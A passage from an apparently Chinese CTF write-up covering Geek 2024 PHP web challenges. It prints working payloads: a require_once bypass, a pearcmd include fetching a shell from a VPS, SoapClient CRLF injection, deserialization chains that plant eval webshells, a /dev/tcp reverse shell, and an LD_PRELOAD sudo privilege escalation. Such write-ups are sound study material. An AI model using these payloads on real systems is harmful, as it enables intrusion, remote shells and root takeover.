class="line">&#125;</span><br></pre></td></tr></table></figure><p>是一个绕过require_once包含限制的题<br>详见<a href="https://www.anquanke.com/post/id/213235">https://www.anquanke.com/post/id/213235</a><br>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/starven_secret.php</span><br></pre></td></tr></table></figure><p>成功进入第二步&#x2F;levelllll2.php:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span> [<span class="string">&quot;syc&quot;</span>];</span><br><span class="line">    <span class="variable">$hint</span> = <span class="string">&quot;register_argc_argv = On&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/config|create|filter|download|phar|log|sess|-c|-d|%|data/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hint都给的这么明显了还不会做?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>], -<span class="number">4</span>) === <span class="string">&#x27;.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察到register_argc_argv &#x3D; On,可能是pear文件包含漏洞<br>构造payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/levelllll2.php?syc=/usr/local/lib/php/pearcmd.php&amp;+download+http://vps地址:vps端口/1.php</span><br></pre></td></tr></table></figure><p>成功getshell</p><h3 id="ez-ssrf"><a href="#ez-ssrf" class="headerlink" title="ez_ssrf"></a>ez_ssrf</h3><p>题目是ssrf,但是题目首页什么都没有<br>使用dirsearch扫描目录发现<code>www.zip</code>泄露<br>发现网页源码:</p><ul><li>h4d333333.php<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="string">&quot;stranger&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$user</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$location</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;location&#x27;</span>];</span><br><span class="line">    <span class="variable">$client</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;location&quot;</span>=&gt;<span class="variable">$location</span>,</span><br><span class="line">        <span class="string">&quot;uri&quot;</span>=&gt;<span class="string">&quot;hahaha&quot;</span>,</span><br><span class="line">        <span class="string">&quot;login&quot;</span>=&gt;<span class="string">&quot;guest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>=&gt;<span class="string">&quot;gueeeeest!!!!&quot;</span>,</span><br><span class="line">        <span class="string">&quot;user_agent&quot;</span>=&gt;<span class="variable">$user</span>.<span class="string">&quot;&#x27;s Chrome&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$client</span>-&gt;<span class="title function_ invoke__">calculator</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;result.txt&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Please give me a location&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>calculator.php<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$admin</span>=<span class="string">&quot;aaaaaaaaaaaadmin&quot;</span>;</span><br><span class="line"><span class="variable">$adminpass</span>=<span class="string">&quot;i_want_to_getI00_inMyT3st&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$auth</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$admin</span>,<span class="variable">$adminpass</span>;</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;Basic &#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="variable">$auth</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;:&#x27;</span>, <span class="variable">$auth</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$username</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="variable">$admin</span> &amp;&amp; <span class="variable">$password</span>===<span class="variable">$adminpass</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]!==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$expression</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;expression&#x27;</span>];</span><br><span class="line"><span class="variable">$auth</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_AUTHORIZATION&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$auth</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check</span>(<span class="variable">$auth</span>)===<span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[0-9+\-*\/]+$/&#x27;</span>, <span class="variable">$expression</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Invalid expression&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$result</span>=<span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$expression</span>;&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;result&quot;</span>,<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>发现可以进行请求头注入<br>需要:</li><li><code>AUTHORIZATION</code>,<code>type</code>为<code>basic</code>,值为base64加密的<code>$admin:$adminpass</code></li><li><code>POST</code>参数<code>expression</code>,值为注入的php代码</li></ul><p>最终payload为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/h4d333333.php?location=http://127.0.0.1/calculator.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=aaa%0D%0AAuthorization%3ABasic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%0D%0AContent-Length%3A80%0D%0A%0D%0Aexpression%3Dfile_put_contents%28%27shell.php%27%2C%27%3C%3Fphp+%40eval%28%24_POST%5B1%5D%29%3B%3F%3E%27%29%3B%26aaa%3Daaaa</span><br></pre></td></tr></table></figure><h1 id="PHP不比Java差"><a href="#PHP不比Java差" class="headerlink" title="PHP不比Java差"></a>PHP不比Java差</h1><p>题目:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;secret.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Challenge</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Sink</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;!!!A GREAT STEP!!!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is there any file?&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$FLAG</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Geek</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>): <span class="title">void</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$change</span>=<span class="variable">$_GET</span>[<span class="string">&quot;change&quot;</span>];</span><br><span class="line">        <span class="variable">$FUNC</span>=<span class="variable">$change</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$FUNC</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Syclover</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Where</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$IS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Starven</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Girlfriend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__toString is called&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$eee</span>=<span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">Where</span>(<span class="variable">$this</span>-&gt;IS);</span><br><span class="line">        <span class="variable">$fff</span>=<span class="variable language_">$this</span>-&gt;Starven;</span><br><span class="line">        <span class="variable">$eee</span>-&gt;<span class="variable">$fff</span>(<span class="variable language_">$this</span>-&gt;Girlfriend);</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>简单分析后我们发现:</p><ul><li>反序列化的起始点在GEEK类</li><li>使用的是php8的新魔术方法</li><li><code>$data</code>数组中的元素是GEEK类的属性</li><li><code>change</code>参数是我们自己传的,可以使用任意魔术方法</li><li><code>$FUNC</code>触发时无法传参,联想到可变函数发数组调用</li></ul><p>于是构造POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Challenge</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;file = <span class="string">&#x27;secret.php&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">array</span>(<span class="variable">$s</span>,<span class="string">&quot;Sink&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>同时传参<code>?change=reset</code>取<code>$data</code>数组的首个元素赋值给<code>$FUNC</code><br>直接调用<code>Challenge类</code>的<code>Sink</code>获得假flag:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The True Flag is in /flag</span><br></pre></td></tr></table></figure><p>那么我们只能再利用<code>Syclover类</code>试图读取&#x2F;flag<br>有趣的是<code>__toString</code>魔术方法也可以使用可变函数的数组调用直接触发<br>参数<code>where</code>是一个类，这里联想到php原生类的利用</p><p>于是构造POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Syclover</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;Where = <span class="string">&#x27;SplFileObject&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;IS = <span class="string">&#x27;/flag&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Starven = <span class="string">&#x27;fpassthru&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Girlfriend = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">array</span>(<span class="variable">$s</span>,<span class="string">&quot;__toString&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p><del>可以看到Starven学长没有Girlfriend</del><br>反序列化之后&#x2F;flag并没有被读取，明明本地测试成功的，怎么回事呢?<br>猜测要提权,要提权先得getshell<br>利用另一个原生类实现<br>由于直接使用shell非常难受，直接在当前网页写个马:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Geek</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="keyword">new</span> <span class="title class_">Syclover</span>();</span><br><span class="line"><span class="variable">$s</span>-&gt;Where = <span class="string">&#x27;ReflectionFunction&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;IS = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Starven = <span class="string">&#x27;invoke&#x27;</span>;</span><br><span class="line"><span class="variable">$s</span>-&gt;Girlfriend = <span class="string">&#x27;echo &quot;echo 123;eval(\$_POST[\&#x27;cmd\&#x27;]);&quot;&gt;&gt;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="keyword">array</span>(<span class="variable">$s</span>,<span class="string">&quot;__toString&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> (<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>使用命令:<code>find / -perm -u=s -type f 2&gt;/dev/null</code><br>列出所有可使用的有root权限的命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/su</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/file</span><br></pre></td></tr></table></figure><p>看这个file有能读文件的意思。。<br>一番搜索后使用:<code>file -f /flag</code><br>成功通过报错的方式读取<code>/flag</code>文件里的内容,成功获得flag</p><h1 id="not-just-pop"><a href="#not-just-pop" class="headerlink" title="not_just_pop"></a>not_just_pop</h1><p>上来是一个pop链:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lhRaMK7</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Do</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$You</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$love</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$web</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;我勒个豆，看来你有点实力，那接下来该怎么拿到flag呢？&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;web);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;web=<span class="variable language_">$this</span>-&gt;love;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;You-&gt;execurise=<span class="variable language_">$this</span>-&gt;Do);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parar</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$execurise</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lead</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hansome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lead;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_readable</span>(<span class="string">&quot;/flag&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;还想直接读flag，洗洗睡吧，rce去&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;execurise==<span class="string">&quot;man!&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;居然没坠机&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hansome-&gt;lover))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;execurise);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;你也想被肘吗&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Starven</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$girl</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$friend</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;试试所想的呗，说不定成功了&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable language_">$this</span>-&gt;girl-&gt;abc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$args1</span>,<span class="variable">$args2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$func</span>=<span class="variable language_">$this</span>-&gt;friend;</span><br><span class="line">        <span class="variable">$func</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYC</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$forever</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;forever-&gt;<span class="title function_ invoke__">nononon</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$Syclover</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;Syclover&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$Syclover</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$Syclover</span>));</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;None&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;怎么不给我呢，是不喜欢吗？&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析发现:</p><ul><li>序列化字符串使用base64加密</li><li>漏洞点在<code>lhRaMK7</code>的<code>__invoke()</code></li><li><code>is_readable(&quot;/flag&quot;)</code>目测不可读，所以后续需要提权</li></ul><p>倒推可得POC:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl = <span class="keyword">new</span> <span class="title class_">Parar</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome = <span class="keyword">new</span> <span class="title function_ invoke__">SYC</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever = <span class="keyword">new</span> <span class="title class_">Starven</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend=<span class="keyword">new</span> <span class="title function_ invoke__">lhRaMK7</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt;You-&gt;lead-&gt;girl-&gt;hansome-&gt;forever-&gt;friend-&gt;love = <span class="string">&quot;file_put_contents(&#x27;a.php&#x27;,&#x27;&lt;?php highlight_file(__FILE__);@eval(\$_POST[1]);?&gt;&#x27;);&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>使用<code>phpinfo()</code>发现php版本为7.2<br>直接使用<code>system()</code>函数发现居然有disable_function<br>于是一个一个试发现<code>file_put_contents()</code>可用,且当前目录可写<br>所以直接写马，上马后使用php版本漏洞绕过disable_function,直接执行命令<br>详见<a href="https://www.youncyb.cn/?p=625#Bypass-disable_functions">文章</a><br>执行<code>bash -c &quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&quot;</code>回弹shell<br>接收后使用<code>perl -e &#39;exec &quot;/bin/sh&quot;;&#39;</code>升交互式<br>一番检查:<br><img src="/2025/03/07/geek2024/shell.png"><br>sudo可以使用<br>看一眼env,发现:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HINT=why_not_trytry_sudo</span><br></pre></td></tr></table></figure><p>使用<code>sudo -l</code>搜索可用指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User www-data may run the following commands on</span><br><span class="line">        dep-0790f3fc-174e-4e43-a484-b6d3615adf07-59c798cd59-nb5c6:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/envUser www-data may run the following commands on</span><br><span class="line">        dep-0790f3fc-174e-4e43-a484-b6d3615adf07-59c798cd59-nb5c6:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/env</span><br></pre></td></tr></table></figure><p>env能用，我寻思env有啥用啊，但是gpt告诉我确实有用:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _init() &#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fPIC -shared -o /tmp/preload.so preload.c</span><br><span class="line">sudo env LD_PRELOAD=/tmp/preload.so /bin/bash</span><br></pre></td></tr></table></figure><p>直接拿下一个root终端,简直crazy<br>直接<code>cat /flag</code><br>获得:<code>SYC&#123;f2e3cce2-5c9c-4876-b7c4-cbb140ebbfd0&#125;</code></p><h1 id="ez-python"><a href="#ez-python" class="headerlink" title="ez_python"></a>ez_python</h1><p>常规注册登录，暂时没有发现可攻击的点<br>但登录后提示查看:<code>/starven_s3cret</code><br>成功获得源码:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, make_response, render_template, send_file</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> 